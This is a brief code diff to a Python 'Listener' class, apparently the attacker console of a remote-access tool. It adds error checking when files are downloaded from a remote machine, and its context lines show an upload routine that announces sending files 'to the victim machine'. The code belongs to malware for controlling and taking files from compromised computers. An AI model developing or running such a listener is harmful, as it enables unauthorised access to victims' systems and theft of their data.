@@ -104,7 +104,10 @@ class Listener:
 
                 elif cmd == 'download' and command_list_len:
                     contents = self.execute_remotely(command)
-                    execution_result = self.write_file(path, contents)
+                    if 'Exception' in contents:
+                        print(contents)
+                    else: 
+                        execution_result = self.write_file(path, contents)
 
                 elif cmd == 'upload' and command_list_len:
                     print('[*] Listener : Uploading file to the victim machine.')
